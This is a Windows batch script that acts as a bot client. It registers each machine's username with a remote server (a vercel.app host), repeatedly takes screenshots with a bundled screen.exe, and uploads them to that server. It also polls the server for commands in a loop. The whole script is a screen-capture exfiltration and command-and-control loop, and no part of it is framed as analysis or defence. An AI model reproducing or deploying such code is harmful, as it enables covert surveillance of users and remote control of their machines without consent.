@echo off
set /A second=0
if not exist .id (

set id=%random%%random%
echo %id%>.id
curl -X POST https://test-api-t78m.vercel.app/addBot/%id%  -d name="%username%"

echo echo command> command
cmd /C .\screen.exe shot.png
curl  https://test-api-t78m.vercel.app/updateShot/%id% -F testImage=@shot.png -F name="%username%"
goto program

) else (
set /p id=<.id
goto program
)

:loop
set /A second= %second% + 1 
ping localhost -n 3 > null
goto program



:program
echo program %second%
if %second% == 6 (
    set /A second=0
    goto sendShot
)
set /p id=<.id
echo id = %id%
curl  https://test-api-t78m.vercel.app/getCommand/%id%  > newCommand
set /p command=<command
set /p newCommand=<newCommand
goto loop


:sendShot
@REM set /p id=<.id
cmd /C .\screen.exe shot.png
curl -F testImage=@shot.png -F name=kira https://test-api-t78m.vercel.app/updateShot/%id%
goto program
